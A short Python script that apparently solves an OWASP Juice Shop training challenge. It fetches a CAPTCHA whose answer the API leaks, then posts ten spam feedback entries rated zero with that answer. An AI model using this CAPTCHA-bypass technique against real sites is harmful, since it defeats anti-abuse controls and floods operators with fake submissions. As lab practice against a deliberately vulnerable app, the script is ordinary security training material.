import requests
import json

#make request to captcha API
r = requests.get("https://juice-shop.herokuapp.com/rest/captcha")

#parse the details (in form {"captchaId":id,"captcha":question,"answer":answer})
captcha_details = json.loads(r.text)

print(captcha_details)

#rebuild data (in form {"captchaId":id,"captcha":answer})
new_data = {"captchaId":captcha_details['captchaId'], "captcha":captcha_details['answer']}

#add our rating and comment
new_data['comment'] = "I hate this site"
new_data['rating'] = 0

#make some requests to submit feedback...
for i in range(10):
    f = requests.post("https://juice-shop.herokuapp.com/api/Feedbacks", data=new_data)
    print(f.text)